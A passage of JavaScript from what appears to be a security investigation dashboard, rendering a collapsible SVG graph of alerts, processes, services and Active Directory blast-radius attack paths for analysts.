  g.setAttribute('onclick', `groupCategory('${parentEid}','${category}')`);

  const circle = document.createElementNS(ns, 'circle');
  circle.setAttribute('cx', cx); circle.setAttribute('cy', cy);
  circle.setAttribute('r', '13'); circle.setAttribute('fill', '#ffffff');
  circle.setAttribute('stroke', stroke); circle.setAttribute('stroke-width', '2');
  circle.setAttribute('stroke-dasharray', '3,2');

  const iconEl = document.createElementNS(ns, 'text');
  iconEl.setAttribute('x', cx); iconEl.setAttribute('y', cy + 4);
  iconEl.setAttribute('text-anchor', 'middle'); iconEl.setAttribute('font-size', '11');
  iconEl.setAttribute('dominant-baseline', 'central');
  iconEl.textContent = iconChar;

  // ✕ collapse badge (top-right)
  const badge = document.createElementNS(ns, 'circle');
  badge.setAttribute('cx', cx + 11); badge.setAttribute('cy', cy - 11);
  badge.setAttribute('r', '5.5'); badge.setAttribute('fill', '#fee2e2');
  badge.setAttribute('stroke', '#dc2626'); badge.setAttribute('stroke-width', '1');
  const badgeTxt = document.createElementNS(ns, 'text');
  badgeTxt.setAttribute('x', cx + 11); badgeTxt.setAttribute('y', cy - 11);
  badgeTxt.setAttribute('text-anchor', 'middle'); badgeTxt.setAttribute('font-size', '7');
  badgeTxt.setAttribute('dominant-baseline', 'central');
  badgeTxt.setAttribute('fill', '#dc2626'); badgeTxt.setAttribute('font-weight', '700');
  badgeTxt.textContent = '✕';

  const lblEl = document.createElementNS(ns, 'text');
  lblEl.setAttribute('x', cx); lblEl.setAttribute('y', cy + 24);
  lblEl.setAttribute('text-anchor', 'middle'); lblEl.setAttribute('font-size', '8');
  lblEl.setAttribute('fill', '#6b7280'); lblEl.setAttribute('font-family', 'Lato,sans-serif');
  lblEl.setAttribute('font-weight', '600');
  lblEl.textContent = 'collapse';

  g.appendChild(circle); g.appendChild(iconEl); g.appendChild(badge); g.appendChild(badgeTxt); g.appendChild(lblEl);
  svg.appendChild(g);
  makeNodeDraggable(g, circle, iconEl, lblEl, hubId);

  g.style.opacity = '0';
  requestAnimationFrame(() => {
    g.style.transition = 'opacity 0.3s ease';
    edge.style.transition = 'opacity 0.3s ease';
    g.style.opacity = '1'; edge.style.opacity = '0.7';
  });

  return { hubId, gEl: g, edgeEl: edge, lblEl: lbl, cx, cy };
}

/* ✕ clicked — shrink all leaves into the hub, which becomes a "Category (N)" count node */
function groupCategory(parentEid, category) {
  const hub = groupHubs[parentEid] && groupHubs[parentEid][category];
  if (!hub || hub.grouped) return;
  const leaves = (drillDownGroups[parentEid] && drillDownGroups[parentEid][category]) || [];
  const count = leaves.length || (hub.entries ? hub.entries.length : 0);

  // Remove the leaf nodes + their hub→leaf edges (the hub itself survives).
  collapseCategory(parentEid, category);

  hub.grouped = true;
  const g = hub.gEl;
  if (g) {
    g.setAttribute('onclick', `expandGroup('${parentEid}','${category}')`);
    const catLabel = category.charAt(0).toUpperCase() + category.slice(1);
    const circles = g.querySelectorAll('circle');
    const texts = g.querySelectorAll('text'); // [icon, badgeTxt, label]
    if (circles[0]) circles[0].setAttribute('stroke-dasharray', '');
    if (circles[1]) { circles[1].setAttribute('fill', '#dcfce7'); circles[1].setAttribute('stroke', '#16a34a'); }
    if (texts[1]) { texts[1].textContent = '+'; texts[1].setAttribute('fill', '#16a34a'); }
    if (texts[2]) { texts[2].textContent = `${catLabel} (${count})`; texts[2].setAttribute('fill', hub.colorConfig.normText || '#374151'); }
  }

  // Alerts own the process/service they exposed — collapse those too.
  if (category === 'alert') _collapseAlertSiblings(parentEid);

  setTimeout(() => updateGraphSummary(), 400);
  showToast(hub.iconChar || '◆', `${count} ${category}(s) grouped`);
}

/* count node clicked — re-expand the leaves off a fresh hub */
function expandGroup(parentEid, category) {
  const hub = groupHubs[parentEid] && groupHubs[parentEid][category];
  if (!hub) return;
  const { entries, edgeLabel, iconChar, colorConfig } = hub;
  const iconMap = { process: '⚙', service: '🔧', alert: '🔔' };
  _removeHub(parentEid, category);
  branchChildNodes(parentEid, category, entries, edgeLabel, iconChar || iconMap[category] || '◆', colorConfig);
  setTimeout(() => updateGraphSummary(), 400);
}

/* Remove just the hub / count node + its parent edge */
function _removeHub(parentEid, category) {
  const hub = groupHubs[parentEid] && groupHubs[parentEid][category];
  if (!hub) return;
  if (hub.gEl) hub.gEl.remove();
  if (hub.edgeEl) hub.edgeEl.remove();
  if (hub.lblEl) hub.lblEl.remove();
  if (groupHubs[parentEid]) delete groupHubs[parentEid][category];
}

/* Full toggle-off: remove leaves (if any) AND the hub/count node */
function collapseGroupCategory(parentEid, category) {
  if (drillDownGroups[parentEid] && drillDownGroups[parentEid][category] &&
      drillDownGroups[parentEid][category].length > 0) {
    collapseCategory(parentEid, category);
  }
  _removeHub(parentEid, category);
  // Alerts own the process/service they exposed — collapse those too.
  if (category === 'alert') _collapseAlertSiblings(parentEid);
  setTimeout(() => updateGraphSummary(), 400);
}

/* When an alert is collapsed/grouped, also collapse the process & service
   branches that were discovered through that alert on the same parent. */
function _collapseAlertSiblings(parentEid) {
  ['process', 'service'].forEach(c => {
    const hasLeaves = drillDownGroups[parentEid] && drillDownGroups[parentEid][c] &&
                      drillDownGroups[parentEid][c].length > 0;
    const hasHub = groupHubs[parentEid] && groupHubs[parentEid][c];
    if (hasLeaves || hasHub) collapseGroupCategory(parentEid, c);
  });
}

/* Collapse a specific category of children */
function collapseCategory(parentEid, category) {
  const group = drillDownGroups[parentEid]?.[category];
  if (!group || group.length === 0) return;
  const svg = document.getElementById('graphSvg');
  const removedIds = [];
  group.forEach(item => {
    // Always remove the edge & label from this parent
    if (item.edgeEl) { item.edgeEl.style.transition = 'opacity 0.3s ease'; item.edgeEl.style.opacity = '0'; setTimeout(() => item.edgeEl.remove(), 350); }
    if (item.lblEl) { item.lblEl.style.transition = 'opacity 0.3s ease'; item.lblEl.style.opacity = '0'; setTimeout(() => item.lblEl.remove(), 350); }

    // If this is a cross-link only (gEl is null), skip node removal entirely
    if (item.crossLink || !item.gEl) return;

    // Check if ANY other edge still connects to this node from another source
    const otherEdges = svg ? svg.querySelectorAll('line[data-target="' + item.nodeId + '"]') : [];
    const hasOtherConnection = Array.from(otherEdges).some(e => {
      // Exclude the edge we're about to remove (already fading)
      if (e === item.edgeEl) return false;
      // Exclude edges whose source is also being collapsed in this same group
      const eSrc = e.getAttribute('data-source');
      if (eSrc === parentEid) return false;
      return true;
    });

    if (hasOtherConnection) {
      // Node stays — it has other connections. Don't remove it or its data.
      return;
    }

    // Recursively collapse any children this node had expanded
    collapseAllChildren(item.nodeId);
    if (item.gEl) { item.gEl.style.transition = 'opacity 0.3s ease'; item.gEl.style.opacity = '0'; setTimeout(() => item.gEl.remove(), 350); }
    // Remove from registry & cleanup
    delete nodeRegistry[item.nodeId];
    delete ENTITIES[item.nodeId];
    delete ENTITY_DISPLAY[item.nodeId];
    removedIds.push(item.nodeId);
  });
  drillDownGroups[parentEid][category] = [];
  setTimeout(() => updateGraphSummary(), 400);
  // If the slider is currently displaying one of the now-removed nodes, swap
  // it over to the parent so the user sees the parent's details instead of a
  // stale slider for a deleted entity.
  const sliderOpen = document.getElementById('graphContainer')?.classList.contains('slider-open');
  if (sliderOpen && sliderEntityId && removedIds.includes(sliderEntityId) && ENTITIES[parentEid]) {
    openEntitySlider(parentEid);
    return;
  }
  // Restore graph highlight state — if the parent's slider is still open,
  // re-focus it; otherwise just clear any lingering dim from a previous click.
  restoreGraphHighlights(sliderOpen && sliderEntityId === parentEid ? parentEid : null);
}

/* Recursively collapse ALL children of a node (all categories) */
function collapseAllChildren(nodeId) {
  const groups = drillDownGroups[nodeId];
  const svg = document.getElementById('graphSvg');
  if (groups) {
    for (const cat of Object.keys(groups)) {
      const items = groups[cat];
      if (!items || items.length === 0) continue;
      items.forEach(item => {
        // Always remove edge & label
        if (item.edgeEl) item.edgeEl.remove();
        if (item.lblEl) item.lblEl.remove();

        // Cross-links: only remove edge, not node
        if (item.crossLink || !item.gEl) return;

        // Check if node still has other connections from a different parent
        const otherEdges = svg ? svg.querySelectorAll('line[data-target="' + item.nodeId + '"]') : [];
        const hasOtherConnection = Array.from(otherEdges).some(e => {
          if (e === item.edgeEl) return false;
          const eSrc = e.getAttribute('data-source');
          if (eSrc === nodeId) return false;
          // Edges sourced from this node's own group hubs are part of this subtree
          if (groupHubs[nodeId] && Object.values(groupHubs[nodeId]).some(h => h.hubId === eSrc)) return false;
          return true;
        });

        if (hasOtherConnection) return; // Node stays

        collapseAllChildren(item.nodeId); // recurse
        if (item.gEl) item.gEl.remove();
        delete nodeRegistry[item.nodeId];
        delete ENTITIES[item.nodeId];
        delete ENTITY_DISPLAY[item.nodeId];
      });
      groups[cat] = [];
    }
    delete drillDownGroups[nodeId];
  }

  // Tear down any group hubs / grouped count nodes this node owns. These live
  // in groupHubs (not drillDownGroups), so without this the "Process (N)" /
  // "Service (N)" hubs would be orphaned when their parent collapses.
  if (groupHubs[nodeId]) {
    for (const cat of Object.keys(groupHubs[nodeId])) {
      _removeHub(nodeId, cat);
    }
    delete groupHubs[nodeId];
  }
}

function ctxRelatedAlerts() {
  hideGraphCtx();
  const eid = ctxEntityId;
  const e = ENTITIES[eid];
  if (!e) return;
  const alertSec = e.sections.recentAlerts;
  if (!alertSec || (!alertSec.timeline?.length && !alertSec.viewAllData?.length)) {
    showToast('🔔', `No alert profiles found for ${e.modalTitle}`);
    return;
  }
  const entries = alertSec.viewAllData || alertSec.timeline;
  const result = branchChildNodes(eid, 'alert', entries, 'INVOLVED_IN', '🔔', {
    labelKey: 'Alert', malStroke: '#ef4444', normStroke: '#ef4444', malText: '#dc2626', normText: '#dc2626'
  });
  if (result === 'collapsed') {
    showToast('➖', `Alert profile nodes collapsed for ${e.modalTitle}`);
  } else {
    updateGraphSummary();
    showToast('🔔', `${entries.length} alert profile(s) branched from ${e.modalTitle}`);
  }
}

// Map a branched-edge relation label to an icon so branched edges show the
// same clickable relation badge style as the main graph (edge-info-btn).
function _branchRelIcon(label) {
  if (!label) return '🔗';
  const L = String(label).toUpperCase().replace(/[\s-]+/g, '_');
  const map = {
    EXECUTED: '▶️', EXECUTED_ON: '▶️', EXECUTEDON: '▶️',
    TRIGGERED: '⚡', TRIGGERED_BY: '⚡', TRIGGEREDBY: '⚡',
    INVOLVED_IN: '🔔', INVOLVEDIN: '🔔',
    ATTACK_PATH: '💥', ATTACKPATH: '💥',
    PATH: '➡️',
    MEMBEROF: '👥', MEMBER_OF: '👥',
    ADD_MEMBER: '➕', ADDMEMBER: '➕',
    WRITE_SPN: '🔑', WRITESPN: '🔑',
    GENERIC_ALL: '🔓', GENERIC_WRITE: '🔓', GENERICALL: '🔓',
    DC_SYNC_RIGHTS: '🏛', DC_SYNC: '🏛', DCSYNC: '🏛',
    RESET_PASSWORD: '🔑', RESETPASSWORD: '🔑'
  };
  if (map[L]) return map[L];
  try {
    const canon = (typeof canonicalRelation === 'function') ? canonicalRelation(label) : label;
    if (typeof REL_GUIDE !== 'undefined') {
      const g = REL_GUIDE.find(r => r.key === canon);
      if (g) return g.icon;
    }
  } catch (e) { /* REL_GUIDE not loaded */ }
  return '🔗';
}

// Build a clickable relation badge (matches the main graph's edge-info-btn) at
// the midpoint of a branched edge, wired to showEdgeRelation for the slider.
function _branchRelBadge(ns, mx, my, eLabel, srcId, tgtId, color) {
  const btn = document.createElementNS(ns, 'g');
  btn.setAttribute('class', 'edge-info-btn');
  btn.setAttribute('data-label', eLabel);
  btn.setAttribute('data-source', srcId);
  btn.setAttribute('data-target', tgtId);
  btn.setAttribute('onclick', 'showEdgeRelation(event,this)');
  const c = document.createElementNS(ns, 'circle');
  c.setAttribute('cx', mx); c.setAttribute('cy', my);
  c.setAttribute('r', '9'); c.setAttribute('fill', '#fff');
  c.setAttribute('stroke', color); c.setAttribute('stroke-width', '1.5');
  const t = document.createElementNS(ns, 'text');
  t.setAttribute('x', mx); t.setAttribute('y', my + 0.5);
  t.setAttribute('text-anchor', 'middle'); t.setAttribute('font-size', '10');
  t.setAttribute('dominant-baseline', 'central');
  t.textContent = _branchRelIcon(eLabel);
  btn.appendChild(c); btn.appendChild(t);
  return btn;
}

// Infer an AD object type + icon from its name (used by blast-radius nodes so
// each path/member shows a meaningful icon instead of a generic 💥).
function _blastObjType(name, crownJewel) {
  const n = (name || '').toLowerCase();
  if (crownJewel) return { type: 'Crown Jewel', icon: '👑' };
  if (/corp\.local|domain controller|\bdc\b|dc hashes|\bdc_/.test(n)) return { type: 'Domain / DC', icon: '🏛' };
  if (/svc[_-]|service account|kerberoast|svc_/.test(n)) return { type: 'Service Account', icon: '🔑' };
  if (/ou=|\bou-|\bou\b/.test(n)) return { type: 'Org Unit', icon: '🗂' };
  if (/sharepoint|finance|\bshare\b|\bfile\b|sensitive|sql/.test(n)) return { type: 'Resource / Asset', icon: '📁' };
  if (/ws-|-pc|corp-ws|computer|\bhost\b/.test(n)) return { type: 'Computer', icon: '🖥' };
  if (/admin|editor|support|group|team|helpdesk-tier/.test(n)) return { type: 'Group', icon: '👥' };
  if (/\.|user|helpdesk/.test(n)) return { type: 'User', icon: '👤' };
  return { type: 'AD Object', icon: '📦' };
}

// Summarize, by entity type, everything reachable from the seed in the live
// graph — used to "explain" the blast radius beyond the AD attack paths.
function _blastImpactBreakdown(nodes, eid) {
  const typeLabels = {
    user: 'user', asset: 'device', device: 'device', ip: 'IP',
    account: 'service', service: 'service', alert: 'alert',
    process: 'process', domain: 'domain', file: 'file'
  };
  const counts = {};
  nodes.forEach(id => {
    if (id === eid) return;
    let t;
    if (/^grp-blast|^blas-ctx/.test(id)) t = 'AD object';
    else if (/^grp-|-ctx-/.test(id)) return; // skip synthetic hubs of other categories
    else {
      const rawType = (ENTITIES[id] && ENTITIES[id].type) || (ENTITY_DISPLAY[id] && ENTITY_DISPLAY[id].type);
      t = typeLabels[rawType] || rawType || 'entity';
    }
    counts[t] = (counts[t] || 0) + 1;
  });
  const plural = (label, n) => n <= 1 ? label
    : label.endsWith('y') ? label.slice(0, -1) + 'ies' : label + 's';
  return Object.entries(counts)
    .sort((a, b) => b[1] - a[1])
    .map(([t, n]) => `${n} ${plural(t, n)}`)
    .join(', ');
}

// Render Blast Radius (attack paths) on the graph as a hub-and-spoke group
// instead of in the slider/action panel. Each outgoing attack path becomes a
// leaf node off a collapsible 💥 hub; the full hop chain lives in the node's
// slider details and can be expanded on-graph into its member objects.
function ctxBlastRadiusGraph() {
  hideGraphCtx();
  const eid = ctxEntityId;
  const e = ENTITIES[eid];
  if (!e) return;
  const br = e.sections?.blastRadius?.blastRadius;
  if (!br || !(br.outgoing && br.outgoing.length)) {
    showToast('💥', `No blast radius data for ${e.modalTitle}`);
    return;
  }
  // Only route NEW blast-radius paths for this entity. Any path whose target
  // node is already on the canvas (shown by a previous expansion or another
  // entity's blast radius) is skipped so we don't redraw / cross-link nodes
  // that are already displayed.
  const isExpanded = (drillDownGroups[eid] && drillDownGroups[eid]['blast'] && drillDownGroups[eid]['blast'].length > 0) ||
                     (typeof groupHubs !== 'undefined' && groupHubs[eid] && groupHubs[eid]['blast']);
  const outgoing = isExpanded
    ? br.outgoing  // collapse path: keep full set so the toggle tears everything down
    : br.outgoing.filter(p => !(typeof findNodeByLabel === 'function' && findNodeByLabel(p.target)));
  if (!isExpanded && !outgoing.length) {
    showToast('💥', `All blast-radius paths for ${e.modalTitle} are already on the graph`);
    return;
  }
  const entries = outgoing.map(p => {
    const hops = p.hops || [];
    const chain = hops.map(h => `${h.from} —${h.rel}→ ${h.to}`).join('\n');
    const firstRel = (hops[0] && hops[0].rel) || 'PATH';
    const targetType = _blastObjType(p.target, p.crownJewel);
    // Members = each object traversed along the path (the chain's `to` values).
    const members = hops.map((h, idx) => {
      const isLast = idx === hops.length - 1;
      const cj = isLast && !!p.crownJewel;
      const ti = _blastObjType(h.to, cj);
      return { name: h.to, type: ti.type, icon: ti.icon, crownJewel: cj, rel: h.rel };
    });
    const stepKv = {};
    hops.forEach((h, idx) => { stepKv[`Step ${idx + 1}`] = `${h.from} —${h.rel}→ ${h.to}`; });
    const memberKv = {};
    members.forEach(m => { memberKv[`${m.icon} ${m.name} (${m.type})`] = `via ${m.rel}`; });
    return {
      malicious: !!p.crownJewel, // path is a malicious attack only if it reaches a crown jewel
      edgeLabel: firstRel,
      icon: targetType.icon,
      details: {
        'Target': p.target,
        'Object Type': targetType.type,
        'Crown Jewel': p.crownJewel ? 'Yes 👑' : 'No',
        'Hops': String(hops.length),
        'Attack Path': chain
      },
      entityExtra: { _blastMembers: members },
      extraSections: {
        attackPath: { label: 'Attack Path', expanded: true, kv: stepKv },
        pathMembers: { label: 'Objects in Path', expanded: true, kv: memberKv }
      }
    };
  });
  const result = branchChildNodes(eid, 'blast', entries, 'ATTACK_PATH', '💥', {
    labelKey: 'Target', malStroke: '#dc2626', normStroke: '#f59e0b', malText: '#dc2626', normText: '#b45309'
  });
  if (result === 'collapsed') {
    if (typeof _clearBlastHighlight === 'function') _clearBlastHighlight();
    showToast('➖', `Blast radius collapsed for ${e.modalTitle}`);
  } else {
    updateGraphSummary();
    const cj = outgoing.filter(p => p.crownJewel).length;
    // Only the newly-routed AD attack paths are drawn for this entity — the
    // rest of the existing graph is left untouched (no reachability dimming /
    // highlighting of nodes that were already on the canvas).
    showToast('💥', `${entries.length} AD attack path(s) · ${cj} → crown jewels`);
  }
}

// Expand a blast-radius path node into the AD objects (members) along its path.
// Crown-jewel members render red, flagging the path as a malicious attack.
function ctxExpandBlastMembers() {
  hideGraphCtx();
  const nodeId = ctxEntityId;
  const e = ENTITIES[nodeId];
  const members = e && e._blastMembers;
  if (!members || !members.length) {
    showToast('👥', 'No path members to expand');
    return;
  }
  const entries = members.map(m => ({
    malicious: !!m.crownJewel,
    icon: m.icon,
    edgeLabel: m.rel || 'PATH',
    details: {
      'Object': m.name,
      'Type': m.type,
      'Crown Jewel': m.crownJewel ? 'Yes 👑' : 'No',
      'Reached Via': m.rel || ''
    }
  }));
  const result = branchChildNodes(nodeId, 'blastmember', entries, 'PATH', '📦', {
    labelKey: 'Object', malStroke: '#dc2626', normStroke: '#0891b2', malText: '#dc2626', normText: '#0e7490'
  });
  if (result === 'collapsed') {
    showToast('➖', 'Path members collapsed');
  } else {
    updateGraphSummary();
    const cj = members.filter(m => m.crownJewel).length;
    showToast('👥', cj ? `${members.length} objects · ⚠ ${cj} crown jewel — malicious path` : `${members.length} objects in path`);
  }
}

function ctxShowProcess() {
  hideGraphCtx();
  const eid = ctxEntityId;
  const e = ENTITIES[eid];
  if (!e) return;
  const procSec = e.sections.processes || e.sections.processesOnHost;
  const svcSec = e.sections.serviceTriggered || e.sections.servicesOnHost;
  const procEntries = procSec ? (procSec.viewAllData || procSec.timeline || []) : [];
  const svcEntries = svcSec ? (svcSec.viewAllData || svcSec.timeline || []) : [];
  // Services are surfaced as processes — render both as ONE unified "process"
  // branch so the graph shows a single entity type instead of two parallel
  // branches (process + service) hanging off the same parent.
  const entries = procEntries.concat(svcEntries);
  if (!entries.length) {
    showToast('⚙', `No processes found for ${e.modalTitle}`);
    return;
  }
  const result = branchChildNodes(eid, 'process', entries, 'EXECUTED', '⚙', {
    labelKey: 'Process Name', altLabelKey: 'Service Name', malStroke: '#ef4444', normStroke: '#16a34a', malText: '#dc2626', normText: '#16a34a'
  });
  if (result === 'collapsed') {
    showToast('➖', `Process nodes collapsed for ${e.modalTitle}`);
  } else {
    updateGraphSummary();
    showToast('⚙', `${entries.length} process(es) branched from ${e.modalTitle}`);
  }
}

function ctxShowServices() {
  hideGraphCtx();
  const eid = ctxEntityId;
  const e = ENTITIES[eid];
  if (!e) return;
  const svcSec = e.sections.serviceTriggered || e.sections.servicesOnHost;
  if (!svcSec || (!svcSec.timeline?.length && !svcSec.viewAllData?.length)) {
    showToast('🔧', `No services found for ${e.modalTitle}`);
    return;
  }
  const entries = svcSec.viewAllData || svcSec.timeline;
  const result = branchChildNodes(eid, 'service', entries, 'TRIGGERED', '🔧', {
    labelKey: 'Service Name', altLabelKey: 'Service', malStroke: '#ea580c', normStroke: '#0891b2', malText: '#ea580c', normText: '#0891b2'
  });
  if (result === 'collapsed') {
    showToast('➖', `Service nodes collapsed for ${e.modalTitle}`);
  } else {
    updateGraphSummary();
    showToast('🔧', `${entries.length} service(s) branched from ${e.modalTitle}`);
  }
}

function ctxEntityDetails() {
  hideGraphCtx();
  if (ctxEntityId) openEntitySlider(ctxEntityId);
}

function ctxSearchLogs() {
  hideGraphCtx();
  if (ctxEntityId) { openEntitySlider(ctxEntityId); showActionPanel('searchLogs', ctxEntityId); }
}

function ctxUebaTimeline() {
  hideGraphCtx();
  if (ctxEntityId) { openEntitySlider(ctxEntityId); showActionPanel('uebaTimeline', ctxEntityId); }
}

function ctxLoginActivity() {
  hideGraphCtx();
  if (!ctxEntityId) return;
  openEntitySlider(ctxEntityId);
  const e = ENTITIES[ctxEntityId];
  if (!e) return;
  // Determine which tab holds logonActivity for this entity type
  const tabMap = { user:'activity', device:'overview', ip:'logon' };
  const tabId = tabMap[e.type] || 'overview';
  setTimeout(() => navigateToTabSection(ctxEntityId, tabId, 'logonActivity'), 120);
}

function ctxBlockEntity() {
  hideGraphCtx();
  if (ctxEntityId) { openEntitySlider(ctxEntityId); showActionPanel('blockEntity', ctxEntityId); }
}

/* ── ACTION PANEL SYSTEM ─────────────────────────────────────── */
